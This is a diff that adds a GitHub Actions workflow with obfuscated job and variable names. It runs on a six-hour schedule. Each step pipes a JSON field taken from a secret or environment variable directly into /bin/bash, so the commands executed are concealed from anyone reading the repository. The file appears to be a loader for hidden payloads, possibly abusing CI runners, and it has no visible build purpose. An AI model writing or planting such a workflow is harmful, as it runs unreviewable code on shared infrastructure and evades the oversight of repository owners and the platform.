@@ -1,0 +1,21 @@
+name: xiasining1267
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '54 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiasining1267
+        env:
+          utmwi910: ${{ secrets.utmwi910 }}
+        run: |
+          echo $utmwi910 | jq -r .h0 | /bin/bash
+          echo $hc555 | jq -r .nn03747 | /bin/bash
+          echo $ohjba86375 | jq -r .j6498 | /bin/bash
+          echo $kqybp0240 | jq -r .pq52960 | /bin/bash
+          echo $dorm35819 | jq -r .l18 | /bin/bash
+
